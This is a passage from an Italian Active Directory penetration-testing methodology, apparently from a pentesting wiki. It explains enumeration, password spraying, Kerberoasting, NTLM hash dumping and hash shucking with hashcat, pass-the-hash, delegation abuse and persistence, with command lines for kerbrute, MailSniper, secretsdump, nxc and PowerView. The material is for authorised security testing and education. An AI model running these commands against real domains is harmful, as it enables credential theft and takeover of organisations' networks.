# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** serve come tecnologia fondamentale, permettendo agli **amministratori di rete** di creare e gestire in modo efficiente **domini**, **utenti** e **oggetti** all'interno di una rete. È progettata per scalare, facilitando l'organizzazione di un gran numero di utenti in **gruppi** e **sottogruppi** gestibili, controllando i **diritti di accesso** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli primari: **domini**, **alberi** e **foreste**. Un **dominio** comprende una raccolta di oggetti, come **utenti** o **dispositivi**, che condividono un database comune. Gli **alberi** sono gruppi di questi domini collegati da una struttura condivisa, e una **foresta** rappresenta la raccolta di più alberi, interconnessi tramite **trust relationships**, formando il livello più alto della struttura organizzativa. Diritti specifici di **accesso** e **comunicazione** possono essere assegnati a ciascuno di questi livelli.

Concetti chiave all'interno di **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Object** – Indica entità all'interno della directory, inclusi **utenti**, **gruppi** o **cartelle condivise**.
3. **Domain** – Funziona come contenitore per gli oggetti della directory; è possibile che più domini coesistano all'interno di una **foresta**, ognuno con la propria raccolta di oggetti.
4. **Tree** – Un raggruppamento di domini che condividono un dominio radice comune.
5. **Forest** – Il livello più alto della struttura organizzativa in Active Directory, composto da diversi alberi con **trust relationships** tra di essi.

**Active Directory Domain Services (AD DS)** comprende una serie di servizi critici per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi comprendono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **utenti** e **domini**, incluse le funzionalità di **authentication** e **search**.
2. **Certificate Services** – Si occupa della creazione, distribuzione e gestione di **digital certificates** sicuri.
3. **Lightweight Directory Services** – Supporta le applicazioni abilitate alla directory tramite il protocollo **LDAP**.
4. **Directory Federation Services** – Fornisce funzionalità di **single-sign-on** per autenticare gli utenti attraverso più applicazioni web in una singola sessione.
5. **Rights Management** – Aiuta a proteggere il materiale soggetto a copyright regolando la sua distribuzione e uso non autorizzati.
6. **DNS Service** – Cruciale per la risoluzione dei **domain names**.

Per una spiegazione più dettagliata consulta: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Per imparare come **attaccare un AD** devi comprendere molto bene il **processo di autenticazione Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Puoi consultare rapidamente [https://wadcoms.github.io/](https://wadcoms.github.io) per avere una vista rapida dei comandi che puoi eseguire per enumerare/sfruttare un AD.

> [!WARNING]
> La comunicazione Kerberos **richiede un nome completo qualificato (FQDN)** per eseguire azioni. Se tenti di accedere a una macchina tramite l'indirizzo IP, **verrà usato NTLM e non Kerberos**.

## Ricognizione Active Directory (No creds/sessions)

Se hai accesso a un ambiente AD ma non possiedi credenziali/sessioni, potresti:

- **Pentest the network:**
- Scansionare la rete, trovare macchine e porte aperte e provare a **sfruttare vulnerabilità** o **estrarre credenziali** da esse (per esempio, [i printer possono essere target molto interessanti](ad-information-in-printers.md)).
- L'enumerazione DNS può fornire informazioni su server chiave nel dominio come web, printer, share, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dai un'occhiata alla guida Generale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) per trovare più informazioni su come fare ciò.
- **Controlla accessi null e Guest sui servizi smb** (questo non funzionerà su versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server SMB può essere trovata qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP può essere trovata qui (prestare **particolare attenzione all'accesso anonimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Raccogliere credenziali **spacciandosi per servizi con Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accedere agli host **abusando del relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogliere credenziali **esponendo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrarre username/nomi da documenti interni, social media, servizi (principalmente web) all'interno degli ambienti di dominio e anche dal materiale pubblicamente disponibile.
- Se trovi i nomi completi dei dipendenti dell'azienda, puoi provare diverse convenzioni di username AD (**read this**). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere di ciascuno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Strumenti:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumerazione degli utenti

- **Anonymous SMB/LDAP enum:** Controlla le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando viene richiesta una **username non valida** il server risponderà usando il codice di errore **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permettendoci di determinare che la username era invalida. Le **username valide** provocheranno o un **TGT in un AS-REP** come risposta o l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che all'utente è richiesta la pre-autenticazione.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contro l'interfaccia MS-NRPC (Netlogon) sui domain controller. Il metodo chiama la funzione `DsrGetDcNameEx2` dopo aver effettuato il binding dell'interfaccia MS-NRPC per verificare se l'utente o il computer esistono senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca può essere trovata [qui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se trovi uno di questi server nella rete, puoi anche eseguire **user enumeration** su di esso. Ad esempio, puoi usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare liste di usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere il **nome delle persone che lavorano in azienda** dalla fase di recon che avresti dovuto eseguire prima. Con nome e cognome puoi usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare possibili username validi.

### Knowing one or several usernames

Ok, quindi sai di avere già uno username valido ma nessuna password... Prova allora:

- [**ASREPRoast**](asreproast.md): Se un utente **non ha** l'attributo _DONT_REQ_PREAUTH_ puoi **richiedere un messaggio AS_REP** per quell'utente che conterrà dei dati cifrati da una derivazione della password dell'utente.
- [**Password Spraying**](password-spraying.md): Proviamo le password più **comuni** per ciascuno degli utenti scoperti; magari qualche utente usa una password debole (tieni conto della password policy!).
- Nota che puoi anche **effettuare password spraying sui server OWA** per cercare di ottenere accesso alle caselle mail degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti essere in grado di **ottenere** alcuni challenge **hash** da crackare avvelenando alcuni protocolli della **rete**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se sei riuscito a enumerare Active Directory avrai **più email e una migliore comprensione della rete**. Potresti riuscire a forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) per ottenere accesso all'ambiente AD.

### Steal NTLM Creds

Se puoi **accedere ad altri PC o share** con l'utente **null o guest** potresti **posizionare file** (come un file SCF) che se in qualche modo vengono aperti **inseriranno una autenticazione NTLM verso di te** così puoi **rubare** il **challenge NTLM** per crackarlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tratta ogni NT hash che già possiedi come un candidato password per altri formati più lenti il cui materiale chiave è derivato direttamente dall'NT hash. Invece di brute-forzare lunghe passphrase in Kerberos RC4 tickets, sfide NetNTLM o credenziali cached, alimenti gli NT hash nelle modalità NT-candidate di Hashcat e lasci che verifichi il riuso delle password senza mai conoscere il plaintext. Questo è particolarmente potente dopo una compromissione di dominio dove puoi raccogliere migliaia di NT hash correnti e storici.

Usa lo shucking quando:

- Hai un corpus NT da DCSync, dump di SAM/SECURITY, o vault di credenziali e devi testare il riuso in altri domini/foreste.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM, o blob DCC/DCC2.
- Vuoi provare rapidamente il riuso per passphrase lunghe e non crackabili e pivotare immediatamente via Pass-the-Hash.

La tecnica **non funziona** contro tipi di crittografia i cui key material non sono l'NT hash (es. Kerberos etype 17/18 AES). Se un dominio impone solo AES, devi tornare alle modalità password regolari.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con history per ottenere il maggior numero possibile di NT hash (e i loro valori precedenti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le voci di history ampliano notevolmente il pool di candidati perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altri modi di raccogliere i segreti NTDS vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) estrae dati locali SAM/SECURITY e logon cached di dominio (DCC/DCC2). Deduplica e aggiungi quegli hash allo stesso file `nt_candidates.txt`.
- **Traccia metadata** – Conserva username/dominio che hanno prodotto ogni hash (anche se il wordlist contiene solo esadecimali). Gli hash corrispondenti ti dicono immediatamente quale principale sta riusando una password quando Hashcat stampa il candidato vincente.
- Preferisci candidati dalla stessa forest o da una forest trusted; questo massimizza la probabilità di overlap quando fai shucking.

#### Hashcat NT-candidate modes

| Tipo di hash                             | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Note:

- Gli input NT-candidate **devono rimanere raw NT hash a 32 esadecimali**. Disabilita gli engine di regole (no `-r`, no modalità ibride) perché il mangling corrompe il materiale chiave del candidato.
- Queste modalità non sono intrinsecamente più veloci, ma lo spazio chiave NTLM (~30,000 MH/s su un M3 Max) è ~100× più veloce del Kerberos RC4 (~300 MH/s). Testare una lista NT curata è molto più economico che esplorare l'intero spazio password nel formato lento.
- Esegui sempre la **versione più recente di Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) perché le modalità 31500/31600/35300/35400 sono state rilasciate recentemente.
- Attualmente non esiste una modalità NT per AS-REQ Pre-Auth, e gli etype AES (19600/19700) richiedono la password in chiaro perché le loro chiavi sono derivate via PBKDF2 da password UTF-16LE, non da raw NT hash.

#### Example – Kerberoast RC4 (mode 35300)

1. Cattura un TGS RC4 per uno SPN target con un utente a basso privilegio (vedi la pagina Kerberoast per i dettagli):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck il ticket con la tua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni candidato NT e verifica il blob `$krb5tgs$23$...`. Una corrispondenza conferma che l'account di servizio usa uno degli NT hash che possiedi.

3. Pivot immediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Puoi opzionalmente recuperare il plaintext in seguito con `hashcat -m 1000 <matched_hash> wordlists/` se necessario.

#### Example – Cached credentials (mode 31600)

1. Dumpa i logon cached da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 per l'utente di dominio interessante in `dcc2_highpriv.txt` e shuckala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una corrispondenza conferma che l'NT hash è già noto nella tua lista, dimostrando che l'utente cached sta riusando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o brute-forzalo in modalità NT veloce per recuperare la stringa.

Lo stesso workflow si applica alle challenge-response NetNTLM (`-m 27000/27100`) e DCC (`-m 31500`). Una volta identificata una corrispondenza puoi lanciare relay, SMB/WMI/WinRM PtH, o ri-crackare l'NT hash con mask/rules offline.



## Enumerating Active Directory WITH credentials/session

Per questa fase devi aver **compromesso le credentials o una sessione di un account di dominio valido.** Se hai alcune credentials valide o una shell come utente di dominio, **ricorda che le opzioni indicate prima sono ancora opzioni per compromettere altri utenti**.

Prima di iniziare l'enumerazione autenticata dovresti sapere qual è il **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Aver compromesso un account è un **passo importante per iniziare a compromettere l'intero dominio**, perché potrai avviare l'**Active Directory Enumeration:**

Riguardo [**ASREPRoast**](asreproast.md) ora puoi trovare ogni possibile utente vulnerabile, e riguardo [**Password Spraying**](password-spraying.md) puoi ottenere una **lista di tutti gli username** e provare la password dell'account compromesso, password vuote e nuove password promettenti.

- Potresti usare il [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Puoi anche usare [**powershell for recon**](../basic-powershell-for-pentesters/index.html) che sarà più stealthy
- Puoi anche [**use powerview**](../basic-powershell-for-pentesters/powerview.md) per estrarre informazioni più dettagliate
- Un altro tool eccellente per il recon in Active Directory è [**BloodHound**](bloodhound.md). Non è **molto stealthy** (dipende dai metodi di collection che usi), ma **se non ti interessa** la stealthness dovresti assolutamente provarlo. Trova dove gli utenti possono RDP, trova percorsi verso altri gruppi, ecc.
- **Altri tool automatizzati per AD enumeration sono:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) poiché potrebbero contenere informazioni interessanti.
- Uno **strumento con GUI** che puoi usare per enumerare la directory è **AdExplorer.exe** dalla suite **SysInternal**.
- Puoi anche cercare nel database LDAP con **ldapsearch** per cercare credenziali nei campi _userPassword_ & _unixUserPassword_, o persino in _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) per altri metodi.
- Se usi **Linux**, puoi anche enumerare il dominio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Potresti anche provare tool automatici come:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

È molto facile ottenere tutti gli username di dominio da Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). In Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione Enumeration sembra breve, è la parte più importante di tutte. Accedi ai link (soprattutto quelli di cmd, powershell, powerview e BloodHound), impara come enumerare un dominio e pratica finché non ti senti a tuo agio. Durante un assessment, questo sarà il momento chiave per trovare la strada verso DA o per decidere che non si può fare nulla.

### Kerberoast

Kerberoasting comporta l'ottenimento di **TGS tickets** usati da servizi legati ad account utente e il cracking della loro cifratura — che si basa sulle password utente — **offline**.

Maggiori dettagli in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una volta ottenute delle credentials puoi verificare se hai accesso a qualche **macchina**. A tal fine, puoi usare **CrackMapExec** per tentare le connessioni su vari server con protocolli diversi, in base alle tue port scans.

### Local Privilege Escalation

Se hai compromesso credentials o una sessione come utente di dominio regolare e hai **accesso** con questo utente a **qualunque macchina nel dominio**, dovresti provare a trovare il modo di **escalare privilegi localmente e cercare credenziali**. Questo perché solo con i privilegi di amministratore locale potrai **dumpare gli hash di altri utenti** in memoria (LSASS) e localmente (SAM).

C'è una pagina completa in questo libro su [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

È molto **improbabile** che troverai **ticket** nell'utente corrente che ti diano permessi per accedere a risorse inaspettate, ma puoi controllare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se sei riuscito a enumerare Active Directory avrai **più email e una migliore comprensione della rete**. Potresti essere in grado di forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Ora che hai alcune credenziali di base dovresti verificare se riesci a **trovare** file **interessanti condivisi all'interno dell'AD**. Potresti farlo manualmente ma è un compito molto noioso e ripetitivo (e ancora di più se trovi centinaia di documenti da controllare).

[**Segui questo link per scoprire gli strumenti che puoi usare.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Rubare NTLM Creds

Se puoi **accedere ad altri PC o condivisioni** potresti **posizionare file** (come un file SCF) che, se in qualche modo vengono aperti, **attiveranno un'autenticazione NTLM verso di te** così potrai **rubare** la **NTLM challenge** per crackerla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalation dei privilegi su Active Directory CON credenziali/sessione privilegiate

**Per le tecniche seguenti un normale utente di dominio non è sufficiente, servono privilegi/credenziali speciali per eseguire questi attacchi.**

### Hash extraction

Si spera che tu sia riuscito a **compromettere qualche account admin locale** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluso il relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Poi, è il momento di estrarre tutti gli hash dalla memoria e localmente.\
[**Leggi questa pagina sui diversi modi per ottenere gli hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta che hai l'hash di un utente**, puoi usarlo per **impersonarlo**.\
Devi usare qualche **tool** che **esegua** l'**autenticazione NTLM usando** quell'**hash**, **oppure** puoi creare un nuovo **sessionlogon** e **iniettare** quell'**hash** dentro **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, quell'**hash** verrà usato. L'ultima opzione è ciò che fa mimikatz.\
[**Leggi questa pagina per maggiori informazioni.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Questo attacco mira a **usare l'hash NTLM dell'utente per richiedere ticket Kerberos**, come alternativa al comune Pass The Hash su protocollo NTLM. Pertanto, questo può essere particolarmente **utile in reti dove il protocollo NTLM è disabilitato** e solo **Kerberos è consentito** come protocollo di autenticazione.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Nel metodo di attacco **Pass The Ticket (PTT)**, gli aggressori **rubano il ticket di autenticazione di un utente** invece della sua password o dei suoi valori hash. Questo ticket rubato viene poi usato per **impersonare l'utente**, ottenendo accesso non autorizzato a risorse e servizi all'interno di una rete.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se hai l'**hash** o la **password** di un **amministratore locale** dovresti provare a **effettuare l'accesso localmente** su altri **PC** con essa.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **rumoroso** e **LAPS** lo **mitigherebbe**.

### MSSQL Abuse & Trusted Links

Se un utente ha privilegi per **accedere a MSSQL instances**, potrebbe usare questo per **eseguire comandi** sull'host MSSQL (se in esecuzione come SA), **rubare** il NetNTLM **hash** o perfino eseguire un **relay** **attack**.\
Inoltre, se una istanza MSSQL è trusted (database link) da una diversa istanza MSSQL, se l'utente ha privilegi sul database trusted, potrà **usare la relazione di trust per eseguire query anche sull'altra istanza**. Questi trust possono essere concatenati e a un certo punto l'utente potrebbe trovare un database mal configurato dove può eseguire comandi.\
**I link tra database funzionano anche attraverso forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso di piattaforme di gestione e deployment IT

Le suite di inventory e deployment di terze parti spesso espongono percorsi potenti verso credenziali ed esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi un oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e hai privilegi di dominio sulla macchina, potrai dumpare TGTs dalla memoria di ogni utente che effettua il login sulla macchina.\ Quindi, se un **Domain Admin logins onto the computer**, potrai dumpare il suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\ Grazie alla constrained delegation potresti persino **compromise automaticamente un Print Server** (si spera che sia un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se un utente o computer è abilitato per "Constrained Delegation" potrà **impersonare qualsiasi utente per accedere ad alcuni servizi su una macchina**.\ Poi, se **comprometti the hash** di questo utente/computer sarai in grado di **impersonare qualsiasi utente** (anche domain admins) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio **WRITE** su un oggetto Active Directory di un computer remoto consente di ottenere l'esecuzione di codice con **privilegi elevati**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **privilegi interessanti su oggetti di dominio** che potrebbero permetterti di **move laterally/** **escalate** privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Scoprire un **Spool service listening** all'interno del dominio può essere **abusato** per **acquisire nuove credenziali** e **escalare privilegi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **raccogliere credenziali dalla memoria** e persino **inject beacons nei loro processi** per impersonarli.\
Solitamente gli utenti accederanno al sistema via RDP, quindi qui trovi come eseguire un paio di attacchi su sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **local Administrator password** sui computer joined al dominio, assicurando che sia **randomized**, unica e frequentemente **changed**. Queste password sono memorizzate in Active Directory e l'accesso è controllato tramite ACLs solo agli utenti autorizzati. Con permessi sufficienti per accedere a queste password, diventa possibile pivotare verso altri computer.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Raccogliere certificates** dalla macchina compromessa potrebbe essere un modo per escalare privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **vulnerable templates** è possibile abusarne per escalare privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una volta ottenuti privilegi **Domain Admin** o ancor meglio **Enterprise Admin**, puoi **dumpare** il **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse prima possono essere usate per persistenza.\
Ad esempio potresti:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** crea un **legittimo Ticket Granting Service (TGS) ticket** per un servizio specifico usando il **NTLM hash** (per esempio, l'**hash dell'account PC**). Questo metodo è impiegato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** implica che un attaccante ottenga accesso al **NTLM hash dell'account krbtgt** in un ambiente Active Directory (AD). Questo account è speciale perché viene usato per firmare tutti i **Ticket Granting Tickets (TGTs)**, essenziali per l'autenticazione nella rete AD.

Una volta che l'attaccante ottiene questo hash, può creare **TGTs** per qualsiasi account desideri (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Sono simili ai golden tickets forgiati in modo da **bypassare i comuni meccanismi di rilevamento dei golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Avere certificates di un account o poterle richiedere** è un ottimo metodo per persistere nell'account dell'utente (anche se cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usare certificates permette anche di mantenere la persistenza con privilegi elevati all'interno del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'oggetto **AdminSDHolder** in Active Directory garantisce la sicurezza dei **privileged groups** (come Domain Admins e Enterprise Admins) applicando una standard **Access Control List (ACL)** su questi gruppi per prevenire modifiche non autorizzate. Tuttavia, questa funzionalità può essere sfruttata; se un attaccante modifica l'ACL di AdminSDHolder per assegnare accesso completo a un utente normale, quell'utente ottiene un controllo esteso su tutti i gruppi privilegiati. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi, permettendo accessi indebiti a meno che non sia strettamente monitorata.

[**Maggiori informazioni sul gruppo AdminSDHolder qui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

All'interno di ogni **Domain Controller (DC)** esiste un account di **local administrator**. Ottenendo diritti di admin su tale macchina, l'hash del local Administrator può essere estratto usando **mimikatz**. Successivamente è necessaria una modifica del registro per **abilitare l'uso di questa password**, permettendo l'accesso remoto all'account local Administrator.


{{#ref}}
dsrm-credentials.md
